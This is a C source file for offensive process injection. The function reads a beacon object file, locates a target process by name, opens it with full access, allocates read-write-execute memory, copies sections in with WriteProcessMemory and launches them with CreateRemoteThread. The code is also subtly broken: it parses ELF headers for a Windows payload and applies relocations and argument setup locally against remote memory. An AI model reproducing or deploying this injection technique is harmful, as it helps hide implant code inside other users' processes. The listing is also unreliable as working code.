#include <windows.h>
#include <stdio.h>
#include "bof_loader.h"
#include "relocator.h"
#include "beacon_apis.h"
#include "process_injector.h"

int inject_parsed_bof_to_process(const char *proc_name, const char *bof_path, char **args, int argc) {
    FILE *file = fopen(bof_path, "rb");
    if (!file) {
        perror("fopen");
        return 0;
    }

    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    rewind(file);

    unsigned char *buffer = malloc(size);
    if (!buffer) {
        fclose(file);
        return 0;
    }

    fread(buffer, 1, size, file);
    fclose(file);

    Elf32_Ehdr *ehdr = (Elf32_Ehdr *)buffer;
    Elf32_Shdr *shdrs = (Elf32_Shdr *)(buffer + ehdr->e_shoff);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(snapshot, &pe)) {
        CloseHandle(snapshot);
        return 0;
    }

    DWORD pid = 0;
    do {
        if (_stricmp(pe.szExeFile, proc_name) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
    } while (Process32Next(snapshot, &pe));
    CloseHandle(snapshot);

    if (!pid) {
        printf("[-] Target process not found: %s\n", proc_name);
        free(buffer);
        return 0;
    }

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        printf("[-] Failed to open target process.\n");
        free(buffer);
        return 0;
    }

    void *remote_mem = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_mem) {
        printf("[-] Allocation failed.\n");
        CloseHandle(hProc);
        free(buffer);
        return 0;
    }

    for (int i = 0; i < ehdr->e_shnum; i++) {
        if (shdrs[i].sh_size > 0 && shdrs[i].sh_type != 8) {
            WriteProcessMemory(hProc, (char *)remote_mem + shdrs[i].sh_addr, buffer + shdrs[i].sh_offset, shdrs[i].sh_size, NULL);
        }
    }

    apply_relocations((unsigned char *)remote_mem, size);

    datap_init(argc, args);
    void *entry = (char *)remote_mem + ehdr->e_entry;
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)entry, NULL, 0, NULL);

    if (!hThread) {
        printf("[-] Remote thread creation failed.\n");
        VirtualFreeEx(hProc, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        free(buffer);
        return 0;
    }

    printf("[+] Injected and executed parsed BOF in %s\n", proc_name);
    CloseHandle(hThread);
    CloseHandle(hProc);
    free(buffer);
    return 1;
}